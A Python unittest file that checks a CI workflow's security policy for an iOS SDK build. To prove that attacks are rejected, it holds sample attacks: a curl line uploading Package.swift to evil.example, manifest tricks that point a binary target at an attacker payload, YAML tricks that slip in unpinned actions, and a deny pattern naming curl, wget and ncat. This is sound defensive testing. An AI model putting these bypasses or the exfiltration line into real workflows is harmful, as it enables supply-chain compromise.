import hashlib
import json
import os
import re
import subprocess
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path


REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
WORKFLOW = REPOSITORY_ROOT / ".github" / "workflows" / "ci.yml"
CHECKOUT_SHA = "11bd71901bbe5b1630ceea73d27597364c9af683"
CANONICAL_WORKFLOW_SHA256 = (
    "1229a4fae82e61c82b417467e0a94146375420b614e568735e1bc8584584ad00"
)
PACKAGE_VERSION = "0.0.8-mediastorm.1"
PACKAGE_CHECKSUM = (
    "1b55d676f8999aae0427bbe221a91d3992747aba903038bb4618bf390a75d01a"
)
EXPECTED_STEP_NAMES = [
    "Check out event commit",
    "Validate locked build environment",
    "Install locked Rust toolchain",
    "Test scripts and reproduce distribution",
]


def workflow_text():
    return WORKFLOW.read_text(encoding="utf-8")


def step_blocks(text):
    return re.findall(
        r"(?ms)^      - name: [^\n]+\n.*?(?=^      - name: |\Z)",
        text,
    )


def named_step(text, name):
    matches = [
        block
        for block in step_blocks(text)
        if block.startswith(f"      - name: {name}\n")
    ]
    if len(matches) != 1:
        raise AssertionError(f"expected exactly one step named {name!r}")
    return matches[0]


def active_step_text(text, name):
    return "\n".join(
        line
        for line in named_step(text, name).splitlines()
        if not line.lstrip().startswith("#")
    )


def manifest_validator_script(text):
    matches = re.findall(
        r"(?ms)^[ \t]+python3 - <<'PY'\n(.*?)^[ \t]+PY[ \t]*$",
        text,
    )
    matches = [
        textwrap.dedent(match)
        for match in matches
        if "from scripts.release_metadata import render_package" in match
    ]
    if len(matches) != 1:
        raise AssertionError("expected exactly one manifest validator heredoc")
    return matches[0]


def run_manifest_validator(
    text,
    manifest,
    rebuilt_checksum=PACKAGE_CHECKSUM,
):
    script = manifest_validator_script(text)
    with tempfile.TemporaryDirectory() as directory:
        (Path(directory) / "Package.swift").write_text(
            manifest,
            encoding="utf-8",
        )
        environment = os.environ.copy()
        environment["PYTHONPATH"] = str(REPOSITORY_ROOT)
        environment["REBUILT_SWIFTPM_CHECKSUM"] = rebuilt_checksum
        return subprocess.run(
            [sys.executable, "-c", script],
            cwd=directory,
            env=environment,
            text=True,
            capture_output=True,
            check=False,
        )


def dump_package(manifest):
    with tempfile.TemporaryDirectory() as directory:
        (Path(directory) / "Package.swift").write_text(
            manifest,
            encoding="utf-8",
        )
        return subprocess.run(
            ["swift", "package", "--disable-sandbox", "dump-package"],
            cwd=directory,
            text=True,
            capture_output=True,
            check=False,
        )


def yaml_structural_lines(text):
    structural = []
    scalar_indent = None
    block_scalar = re.compile(r":\s*[>|][+-]?\s*(?:#.*)?$")
    for line in text.splitlines():
        stripped = line.lstrip(" ")
        indent = len(line) - len(stripped)
        if scalar_indent is not None:
            if not stripped or indent > scalar_indent:
                continue
            scalar_indent = None
        structural.append(line)
        if block_scalar.search(line):
            scalar_indent = indent
    return structural


def action_declarations(text):
    action_key = re.compile(
        r"""(?x)(?:"uses"|'uses'|(?<![0-9A-Za-z_-])uses)\s*:"""
    )
    explicit_action_key = re.compile(
        r"""(?x)^\s*(?:-\s*)?\?\s*(?:"uses"|'uses'|uses)\s*$"""
    )
    alternate_yaml_mechanism = re.compile(
        r"""(?x)(?:\\|^\s*(?:-\s*)?\?|"""
        r"""(?:^|[\s\[{,])[&*][^\s\[\]{},]+|<<:|!!|^\s*%)"""
    )
    return [
        line.strip()
        for line in yaml_structural_lines(text)
        if (
            action_key.search(line)
            or explicit_action_key.search(line)
            or alternate_yaml_mechanism.search(line)
        )
    ]


def assert_safe_actions(test, text):
    test.assertEqual(
        action_declarations(text),
        [f"uses: actions/checkout@{CHECKOUT_SHA}"],
    )
    checkout = named_step(text, "Check out event commit")
    test.assertIn(f"uses: actions/checkout@{CHECKOUT_SHA}", checkout)
    test.assertRegex(checkout, r"(?m)^\s+persist-credentials:\s*false\s*$")
    test.assertNotRegex(checkout, r"(?m)^\s+ref:")


def assert_read_only_permissions(test, text):
    match = re.search(
        r"(?ms)^permissions:\n((?:^  [^\n]+\n)+)",
        text,
    )
    test.assertIsNotNone(match, "missing top-level permissions")
    test.assertEqual(match.group(1), "  contents: read\n")
    test.assertNotRegex(text, r"(?mi)^\s*(?:contents|id-token|packages):\s*write\s*$")


def assert_safe_triggers(test, text):
    trigger = re.search(r"(?ms)^on:\n(.*?)(?=^[a-zA-Z][^:\n]*:|\Z)", text)
    test.assertIsNotNone(trigger, "missing workflow triggers")
    body = trigger.group(1)
    test.assertRegex(body, r"(?m)^  pull_request:\s*$")
    test.assertRegex(body, r"(?m)^  push:\s*$")
    test.assertRegex(
        body,
        r'(?m)^    branches:\s*\[main,\s*"mediastorm/\*\*"\]\s*$',
    )
    test.assertNotIn("pull_request_target", text)
    test.assertNotRegex(body, r"(?m)^  release:")
    test.assertNotRegex(body, r"(?m)^  workflow_run:")


def assert_toolchain_validation(test, text):
    block = named_step(text, "Validate locked build environment")
    required = (
        "build-environment.lock.json",
        '"runner": "macos-26"',
        '"xcodeVersion": "26.6"',
        '"xcodeBuildVersion": "17F113"',
        '"swiftVersion": "6.3.3"',
        '"swiftLanguageRevision": "swiftlang-6.3.3.1.3"',
        '"rustVersion": "1.96.1"',
        '"zipVersion": "3.0"',
        "/Applications/Xcode_26.6.app",
        "xcode-select --switch",
        "$'Xcode 26.6\\nBuild version 17F113'",
        "Apple Swift version 6.3.3 (swiftlang-6.3.3.1.3 ",
        'ACTUAL_RUNNER="macos-${ACTUAL_MACOS_VERSION%%.*}"',
        '"$ACTUAL_RUNNER" == "macos-26"',
        "This is Zip 3.0 ",
    )
    for fragment in required:
        test.assertIn(fragment, block)
    test.assertNotIn("DEVELOPER_DIR", text)


def assert_rust_setup(test, text):
    block = named_step(text, "Install locked Rust toolchain")
    required = (
        "rustup toolchain install 1.96.1 --profile minimal",
        "rustup target add --toolchain 1.96.1",
        "rustup run 1.96.1 rustc --version",
        '"rustc 1.96.1 ("',
    )
    for fragment in required:
        test.assertIn(fragment, block)
    test.assertRegex(block, r"(?m)^\s+aarch64-apple-ios \\\s*$")
    test.assertRegex(block, r"(?m)^\s+aarch64-apple-ios-sim\s*$")


def assert_canonical_manifest_validation(test, text):
    environment = active_step_text(text, "Validate locked build environment")
    reproduction = active_step_text(
        text,
        "Test scripts and reproduce distribution",
    )
    required = (
        'if ! command -v "$required_tool"',
        "required CI tool is unavailable",
    )
    for fragment in required:
        test.assertIn(fragment, environment)
    test.assertNotRegex(text, r"(?m)^\s*(?:if\s+)?rg\b")
    required = (
        'export REBUILT_SWIFTPM_CHECKSUM="$SWIFTPM_CHECKSUM_1"',
        "python3 - <<'PY'",
        "from scripts.release_metadata import render_package",
        f'version = "{PACKAGE_VERSION}"',
        'os.environ["REBUILT_SWIFTPM_CHECKSUM"]',
        'render_package(version, rebuilt_checksum).encode("utf-8")',
        'Path("Package.swift").read_bytes()',
        "if actual != expected:",
        "must exactly match the canonical generated",
        '[[ "$ARCHIVE_SHA_1" == "$DECLARED_PACKAGE_CHECKSUM" ]]',
        "swift package --disable-sandbox dump-package",
        "from scripts.release_metadata import release_url",
        'targets[0].get("url") == release_url(version)',
        'targets[0].get("checksum")',
    )
    for fragment in required:
        test.assertIn(fragment, reproduction)


def assert_validation_commands(test, text):
    commands = active_step_text(text, "Test scripts and reproduce distribution")
    exact_commands = (
        "python3 -m unittest discover -s tests -v",
        "bash -n scripts/*.sh",
        "./scripts/build-ios.sh --output .build/ci-repro-1",
        "./scripts/verify-artifact.sh .build/ci-repro-1",
        "python3 scripts/archive.py --source "
        ".build/ci-repro-1/fcast_sender_sdk.xcframework "
        "--output .build/ci-repro-1.zip --source-epoch 1784900561",
        "./scripts/build-ios.sh --output .build/ci-repro-2",
        "./scripts/verify-artifact.sh .build/ci-repro-2",
        "python3 scripts/archive.py --source "
        ".build/ci-repro-2/fcast_sender_sdk.xcframework "
        "--output .build/ci-repro-2.zip --source-epoch 1784900561",
        "cmp .build/ci-repro-1.zip .build/ci-repro-2.zip",
        "./scripts/verify-local-package.sh .build/ci-repro-1",
    )
    active_lines = [line.strip() for line in commands.splitlines() if line.strip()]
    for command in exact_commands:
        test.assertIn(command, active_lines)
    required_expressions = (
        "shasum -a 256 .build/ci-repro-1.zip",
        "shasum -a 256 .build/ci-repro-2.zip",
        "swift package compute-checksum .build/ci-repro-1.zip",
        "swift package compute-checksum .build/ci-repro-2.zip",
    )
    for fragment in required_expressions:
        test.assertIn(fragment, commands)
    test.assertNotRegex(
        commands,
        r"--output\s+\.build/ci-repro-[12]/[^\s]*\.zip",
    )
    ordered = (
        "./scripts/build-ios.sh --output .build/ci-repro-1",
        "./scripts/verify-artifact.sh .build/ci-repro-1",
        "python3 scripts/archive.py --source "
        ".build/ci-repro-1/fcast_sender_sdk.xcframework "
        "--output .build/ci-repro-1.zip --source-epoch 1784900561",
        "./scripts/build-ios.sh --output .build/ci-repro-2",
        "./scripts/verify-artifact.sh .build/ci-repro-2",
        "python3 scripts/archive.py --source "
        ".build/ci-repro-2/fcast_sender_sdk.xcframework "
        "--output .build/ci-repro-2.zip --source-epoch 1784900561",
        "cmp .build/ci-repro-1.zip .build/ci-repro-2.zip",
        "./scripts/verify-local-package.sh .build/ci-repro-1",
    )
    indices = [active_lines.index(command) for command in ordered]
    test.assertEqual(indices, sorted(indices))


def assert_no_publication(test, text):
    forbidden = (
        r"(?mi)^\s*release:\s*$",
        r"(?i)pull_request_target",
        r"(?i)actions/upload-artifact",
        r"(?i)\bgh\s+release\b",
        r"(?i)\bgit\s+(?:push|tag)\b",
        r"(?i)\b(?:secrets|github\.token)\b",
        r"(?i)\bGITHUB_TOKEN\b",
        r"(?i)\b(?:upload|release)[_-]?token\b",
        r"(?i)\bsoftprops/action-gh-release\b",
        r"(?i)\b(?:curl|wget|scp|sftp|ftp|rsync|ncat)\b",
    )
    for pattern in forbidden:
        test.assertNotRegex(text, pattern)


def assert_workflow_policy(test, text):
    digest = hashlib.sha256(text.encode("utf-8")).hexdigest()
    test.assertEqual(
        digest,
        CANONICAL_WORKFLOW_SHA256,
        "workflow bytes differ from the reviewed command allowlist",
    )
    names = [
        re.match(r"^      - name: (.+)$", block.splitlines()[0]).group(1)
        for block in step_blocks(text)
    ]
    test.assertEqual(names, EXPECTED_STEP_NAMES)
    test.assertNotRegex(text, r"(?m)^\s+if:")
    assert_safe_triggers(test, text)
    assert_read_only_permissions(test, text)
    assert_safe_actions(test, text)
    assert_toolchain_validation(test, text)
    assert_rust_setup(test, text)
    assert_canonical_manifest_validation(test, text)
    assert_validation_commands(test, text)
    assert_no_publication(test, text)


def run_declared_checksum_comparison(text, archive_checksum, declared_checksum):
    block = active_step_text(text, "Test scripts and reproduce distribution")
    matches = re.findall(
        r'(?m)^\s*(\[\[ "\$ARCHIVE_SHA_1" == '
        r'"\$DECLARED_PACKAGE_CHECKSUM" \]\])\s*$',
        block,
    )
    if len(matches) != 1:
        raise AssertionError(
            "expected exactly one archive-to-Package.swift checksum comparison"
        )
    return subprocess.run(
        [
            "bash",
            "-c",
            "set -euo pipefail\n"
            'ARCHIVE_SHA_1="$1"\n'
            'DECLARED_PACKAGE_CHECKSUM="$2"\n'
            f"{matches[0]}\n",
            "checksum-comparison",
            archive_checksum,
            declared_checksum,
        ],
        text=True,
        capture_output=True,
        check=False,
    )


class WorkflowPolicyTests(unittest.TestCase):
    def test_workflow_exists_and_has_exact_identity(self):
        text = workflow_text()
        self.assertRegex(text, r"(?m)^name: FCast iOS Distribution CI$")
        self.assertRegex(text, r"(?m)^    runs-on: macos-26$")
        assert_workflow_policy(self, text)

    def test_triggers_are_read_only_branch_validation_events(self):
        assert_safe_triggers(self, workflow_text())

    def test_trigger_mutations_are_rejected(self):
        text = workflow_text()
        for mutation in (
            text.replace("pull_request:", "pull_request_target:", 1),
            text.replace('[main, "mediastorm/**"]', "[main]", 1),
            text.replace("  pull_request:\n", "", 1),
        ):
            with self.subTest(mutation=mutation[:80]):
                with self.assertRaises(AssertionError):
                    assert_safe_triggers(self, mutation)

    def test_permissions_are_top_level_and_read_only(self):
        assert_read_only_permissions(self, workflow_text())

    def test_write_permission_mutations_are_rejected(self):
        text = workflow_text()
        for mutation in (
            text.replace("contents: read", "contents: write", 1),
            text.replace("  contents: read\n", "  contents: read\n  id-token: write\n", 1),
        ):
            with self.subTest(mutation=mutation[:100]):
                with self.assertRaises(AssertionError):
                    assert_read_only_permissions(self, mutation)

    def test_concurrency_is_scoped_to_workflow_and_ref(self):
        text = workflow_text()
        match = re.search(
            r"(?ms)^concurrency:\n((?:^  [^\n]+\n)+)",
            text,
        )
        self.assertIsNotNone(match)
        self.assertEqual(
            match.group(1),
            "  group: ${{ github.workflow }}-${{ github.ref }}\n"
            "  cancel-in-progress: true\n",
        )

    def test_checkout_is_the_only_action_and_is_immutable(self):
        assert_safe_actions(self, workflow_text())

    def test_dangerous_action_and_ref_mutations_are_rejected(self):
        text = workflow_text()
        mutations = (
            text.replace(f"checkout@{CHECKOUT_SHA}", "checkout@v4", 1),
            text.replace(
                "          persist-credentials: false\n",
                "          persist-credentials: false\n          ref: refs/heads/main\n",
                1,
            ),
            text.replace(
                f"uses: actions/checkout@{CHECKOUT_SHA}",
                f"uses: actions/checkout@{CHECKOUT_SHA}\n"
                "      - uses: actions/setup-python@v5",
                1,
            ),
            text.replace(
                f"uses: actions/checkout@{CHECKOUT_SHA}",
                f"uses: actions/checkout@{CHECKOUT_SHA}\n"
                '      - "uses": owner/dangerous-action@v1',
                1,
            ),
            text.replace(
                f"uses: actions/checkout@{CHECKOUT_SHA}",
                f"uses: actions/checkout@{CHECKOUT_SHA}\n"
                "      - 'uses': 'owner/dangerous-action@v1'",
                1,
            ),
            text.replace(
                f"uses: actions/checkout@{CHECKOUT_SHA}",
                f"uses: actions/checkout@{CHECKOUT_SHA}\n"
                "      - {uses: owner/dangerous-action@v1}",
                1,
            ),
            text.replace(
                f"uses: actions/checkout@{CHECKOUT_SHA}",
                f"uses: actions/checkout@{CHECKOUT_SHA}\n"
                '      - ? "uses"\n'
                "        : owner/dangerous-action@v1",
                1,
            ),
            text.replace(
                f"uses: actions/checkout@{CHECKOUT_SHA}",
                f"uses: actions/checkout@{CHECKOUT_SHA}\n"
                '      - "u\\u0073es": owner/dangerous-action@v1',
                1,
            ),
            text.replace(
                f"uses: actions/checkout@{CHECKOUT_SHA}",
                "x-action-key: &action-key uses\n"
                f"        uses: actions/checkout@{CHECKOUT_SHA}\n"
                "      - *action-key: owner/dangerous-action@v1",
                1,
            ),
            text.replace(
                f"uses: actions/checkout@{CHECKOUT_SHA}",
                "x-action-key: &1 uses\n"
                f"        uses: actions/checkout@{CHECKOUT_SHA}\n"
                "      - *1: owner/dangerous-action@v1",
                1,
            ),
            text.replace(
                f"uses: actions/checkout@{CHECKOUT_SHA}",
                "x-action-key: &9-anchor uses\n"
                f"        uses: actions/checkout@{CHECKOUT_SHA}\n"
                "      - *9-anchor: owner/dangerous-action@v1",
                1,
            ),
            text.replace(
                f"uses: actions/checkout@{CHECKOUT_SHA}",
                f"uses: actions/checkout@{CHECKOUT_SHA}\n"
                '      - "u\\\n'
                '          ses": owner/dangerous-action@v1',
                1,
            ),
            text.replace(
                f"uses: actions/checkout@{CHECKOUT_SHA}",
                f"uses: actions/checkout@{CHECKOUT_SHA}\n"
                "      - ? |-\n"
                "          uses\n"
                "        : owner/dangerous-action@v1",
                1,
            ),
        )
        for mutation in mutations:
            with self.subTest(mutation=mutation[:120]):
                with self.assertRaises(AssertionError):
                    assert_safe_actions(self, mutation)

    def test_runner_and_locked_environment_are_exactly_validated(self):
        text = workflow_text()
        self.assertRegex(text, r"(?m)^    runs-on: macos-26$")
        assert_toolchain_validation(self, text)

    def test_runner_mutation_is_rejected(self):
        text = workflow_text().replace("runs-on: macos-26", "runs-on: macos-15", 1)
        with self.assertRaises(AssertionError):
            self.assertRegex(text, r"(?m)^    runs-on: macos-26$")

    def test_missing_or_loose_environment_checks_are_rejected(self):
        text = workflow_text()
        for fragment in (
            '"xcodeBuildVersion": "17F113"',
            '"swiftLanguageRevision": "swiftlang-6.3.3.1.3"',
            "$'Xcode 26.6\\nBuild version 17F113'",
            "Apple Swift version 6.3.3 (swiftlang-6.3.3.1.3 ",
            '"$ACTUAL_RUNNER" == "macos-26"',
            "This is Zip 3.0 ",
        ):
            with self.subTest(fragment=fragment):
                mutation = text.replace(fragment, "")
                with self.assertRaises(AssertionError):
                    assert_toolchain_validation(self, mutation)

    def test_rust_install_and_targets_are_exact(self):
        assert_rust_setup(self, workflow_text())

    def test_rust_setup_mutations_are_rejected(self):
        text = workflow_text()
        for fragment in (
            "rustup toolchain install 1.96.1 --profile minimal",
            "rustup target add --toolchain 1.96.1",
            "aarch64-apple-ios",
            "aarch64-apple-ios-sim",
            '"rustc 1.96.1 ("',
        ):
            with self.subTest(fragment=fragment):
                mutation = text.replace(fragment, "")
                with self.assertRaises(AssertionError):
                    assert_rust_setup(self, mutation)

    def test_manifest_scan_rejects_all_mutable_reference_classes(self):
        assert_canonical_manifest_validation(self, workflow_text())

    def test_manifest_validator_accepts_the_canonical_bound_url(self):
        text = workflow_text()
        manifest = (REPOSITORY_ROOT / "Package.swift").read_text(encoding="utf-8")
        result = run_manifest_validator(text, manifest)
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_manifest_validator_rejects_suffix_and_same_line_bypasses(self):
        text = workflow_text()
        manifest = (REPOSITORY_ROOT / "Package.swift").read_text(encoding="utf-8")
        url = re.search(r'https://[^"]+', manifest).group(0)
        bypasses = (
            manifest.replace(f'{url}"', f'{url}.evil"', 1),
            manifest.replace(
                f'let url = "{url}"',
                f'let url = "{url}", fallback = "https://evil.example/payload.zip"',
                1,
            ),
        )
        for bypass in bypasses:
            with self.subTest(bypass=bypass.splitlines()[4]):
                result = run_manifest_validator(text, bypass)
                self.assertNotEqual(result.returncode, 0)
                self.assertIn("canonical generated", result.stderr)

    def test_manifest_validator_rejects_unbound_composed_and_alternate_urls(self):
        text = workflow_text()
        manifest = (REPOSITORY_ROOT / "Package.swift").read_text(encoding="utf-8")
        url = re.search(r'https://[^"]+', manifest).group(0)
        bypasses = (
            manifest.replace(
                f'let url = "{url}"',
                f'let allowed = "{url}"\n'
                'let url = "ht" + "tps://evil.example/latest.zip"',
                1,
            ),
            manifest.replace(
                f'let url = "{url}"',
                f'let allowed = "{url}"\n'
                'let evil = "ht" + "tps://evil.example/latest.zip"\n'
                "let url = evil",
                1,
            ),
            manifest.replace("url: url,", "url: evil,", 1),
            manifest.replace(
                ".binaryTarget(name: \"fcast_sender_sdkFFI\", "
                "url: url, checksum: checksum)",
                ".binaryTarget(name: \"fcast_sender_sdkFFI\", "
                "path: \"Artifacts/fcast_sender_sdk.xcframework\")",
                1,
            ),
        )
        for bypass in bypasses:
            with self.subTest(bypass=bypass):
                result = run_manifest_validator(text, bypass)
                self.assertNotEqual(result.returncode, 0)
                self.assertIn("canonical generated", result.stderr)

    def test_manifest_validator_rejects_shadowed_or_redefined_url_binding(self):
        text = workflow_text()
        manifest = (REPOSITORY_ROOT / "Package.swift").read_text(encoding="utf-8")
        bypasses = (
            manifest.replace(
                "let checksum =",
                'let shadow = url\nlet checksum =',
                1,
            ),
            manifest.replace(
                "let checksum =",
                'let url = "https://evil.example/latest.zip"\nlet checksum =',
                1,
            ),
        )
        for bypass in bypasses:
            with self.subTest(bypass=bypass):
                result = run_manifest_validator(text, bypass)
                self.assertNotEqual(result.returncode, 0)
                self.assertIn("canonical generated", result.stderr)

    def test_manifest_validator_rejects_compiler_valid_raw_string_desync(self):
        text = workflow_text()
        manifest = (REPOSITORY_ROOT / "Package.swift").read_text(encoding="utf-8")
        url = re.search(r'https://[^"]+', manifest).group(0)
        evil_url = "https://evil.example/payload.zip"
        bypass = manifest.replace(
            f'let url = "{url}"',
            f'let url = "{url}"\n'
            '.isEmpty ? "" : '
            '({ let raw = #"x"//"#; '
            f'return "ht" + "tps://evil.example/payload.zip" }}())',
            1,
        )

        dumped = dump_package(bypass)
        self.assertEqual(dumped.returncode, 0, dumped.stderr)
        payload = json.loads(dumped.stdout)
        binary = next(
            target
            for target in payload["targets"]
            if target["name"] == "fcast_sender_sdkFFI"
        )
        self.assertEqual(binary["url"], evil_url)

        result = run_manifest_validator(text, bypass)
        self.assertNotEqual(result.returncode, 0)

    def test_manifest_scan_policy_mutations_are_rejected(self):
        text = workflow_text()
        for fragment in (
            'if ! command -v "$required_tool"',
            "required CI tool is unavailable",
            'export REBUILT_SWIFTPM_CHECKSUM="$SWIFTPM_CHECKSUM_1"',
            "python3 - <<'PY'",
            "from scripts.release_metadata import render_package",
            f'version = "{PACKAGE_VERSION}"',
            'render_package(version, rebuilt_checksum).encode("utf-8")',
            'Path("Package.swift").read_bytes()',
            "if actual != expected:",
            "swift package --disable-sandbox dump-package",
            "from scripts.release_metadata import release_url",
        ):
            with self.subTest(fragment=fragment):
                mutation = text.replace(fragment, "")
                with self.assertRaises(AssertionError):
                    assert_canonical_manifest_validation(self, mutation)

    def test_manifest_validation_has_no_unproved_search_tool_dependency(self):
        block = active_step_text(
            workflow_text(),
            "Validate locked build environment",
        )
        self.assertNotRegex(block, r"(?m)^\s*(?:if\s+)?rg\b")
        self.assertRegex(block, r"(?m)^\s+python3\s*$")
        self.assertIn('command -v "$required_tool"', block)

    def test_full_tests_and_two_clean_reproducible_builds_are_required(self):
        assert_validation_commands(self, workflow_text())

    def test_rebuilt_archive_must_match_declared_package_checksum(self):
        archive_checksum = "1b55d676f8999aae0427bbe221a91d3992747aba903038bb4618bf390a75d01a"
        accepted = run_declared_checksum_comparison(
            workflow_text(),
            archive_checksum,
            archive_checksum,
        )
        self.assertEqual(accepted.returncode, 0, accepted.stderr)

        rejected = run_declared_checksum_comparison(
            workflow_text(),
            archive_checksum,
            "0" * 64,
        )
        self.assertNotEqual(rejected.returncode, 0)

        manifest = (REPOSITORY_ROOT / "Package.swift").read_text(encoding="utf-8")
        zero_checksum_manifest = manifest.replace(
            PACKAGE_CHECKSUM,
            "0" * 64,
            1,
        )
        rejected_manifest = run_manifest_validator(
            workflow_text(),
            zero_checksum_manifest,
            archive_checksum,
        )
        self.assertNotEqual(rejected_manifest.returncode, 0)
        self.assertIn("canonical generated", rejected_manifest.stderr)

    def test_missing_build_validation_commands_are_rejected(self):
        text = workflow_text()
        for fragment in (
            "python3 -m unittest discover -s tests -v",
            "bash -n scripts/*.sh",
            "./scripts/build-ios.sh --output .build/ci-repro-1",
            "./scripts/verify-artifact.sh .build/ci-repro-1",
            "--output .build/ci-repro-1.zip --source-epoch 1784900561",
            "./scripts/build-ios.sh --output .build/ci-repro-2",
            "./scripts/verify-artifact.sh .build/ci-repro-2",
            "--output .build/ci-repro-2.zip --source-epoch 1784900561",
            "cmp .build/ci-repro-1.zip .build/ci-repro-2.zip",
            "swift package compute-checksum .build/ci-repro-1.zip",
            "./scripts/verify-local-package.sh .build/ci-repro-1",
        ):
            with self.subTest(fragment=fragment):
                mutation = text.replace(fragment, "", 1)
                with self.assertRaises(AssertionError):
                    assert_validation_commands(self, mutation)

    def test_archives_are_siblings_not_artifact_directory_members(self):
        text = workflow_text()
        assert_validation_commands(self, text)
        commands = named_step(text, "Test scripts and reproduce distribution")
        self.assertNotRegex(
            commands,
            r"--output\s+\.build/ci-repro-[12]/[^\s]*\.zip",
        )

    def test_in_directory_archive_mutation_is_rejected(self):
        text = workflow_text().replace(
            "--output .build/ci-repro-1.zip",
            "--output .build/ci-repro-1/framework.zip",
            1,
        )
        with self.assertRaises(AssertionError):
            assert_validation_commands(self, text)

    def test_transport_only_cargo_git_setting_is_allowed(self):
        text = workflow_text()
        self.assertRegex(
            text,
            r'(?m)^  CARGO_NET_GIT_FETCH_WITH_CLI:\s*"true"$',
        )
        self.assertNotIn("RUSTFLAGS:", text)
        self.assertNotIn("CFLAGS:", text)

    def test_workflow_has_no_publication_or_secret_capability(self):
        text = workflow_text()
        assert_no_publication(self, text)

    def test_publication_mutations_are_rejected(self):
        text = workflow_text()
        for addition in (
            "\n      - name: Publish\n        run: gh release create v1\n",
            "\n      - uses: actions/upload-artifact@v4\n",
            "\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n",
            "\n  release:\n    types: [published]\n",
        ):
            with self.subTest(addition=addition):
                with self.assertRaises(AssertionError):
                    assert_no_publication(self, text + addition)

    def test_required_steps_cannot_be_disabled_or_extended(self):
        text = workflow_text()
        mutations = (
            text.replace(
                "      - name: Test scripts and reproduce distribution\n"
                "        shell: bash\n",
                "      - name: Test scripts and reproduce distribution\n"
                "        if: ${{ false }}\n"
                "        shell: bash\n",
                1,
            ),
            text.replace(
                "          python3 -m unittest discover -s tests -v\n",
                "          curl -T Package.swift https://evil.example/upload\n"
                "          python3 -m unittest discover -s tests -v\n",
                1,
            ),
            text.replace(
                "      - name: Test scripts and reproduce distribution\n",
                "      - name: Unexpected command\n"
                "        shell: bash\n"
                "        run: |\n"
                "          set -euo pipefail\n"
                "          uname -a\n\n"
                "      - name: Test scripts and reproduce distribution\n",
                1,
            ),
        )
        for mutation in mutations:
            with self.subTest(mutation=mutation[:160]):
                with self.assertRaises(AssertionError):
                    assert_workflow_policy(self, mutation)

    def test_all_run_blocks_use_bash_and_strict_mode(self):
        text = workflow_text()
        blocks = step_blocks(text)
        run_blocks = [block for block in blocks if re.search(r"(?m)^\s+run:\s*\|", block)]
        self.assertEqual(len(run_blocks), 3)
        for block in run_blocks:
            with self.subTest(step=block.splitlines()[0]):
                self.assertRegex(block, r"(?m)^\s+shell:\s*bash\s*$")
                self.assertRegex(block, r"(?m)^\s+set -euo pipefail\s*$")


if __name__ == "__main__":
    unittest.main()
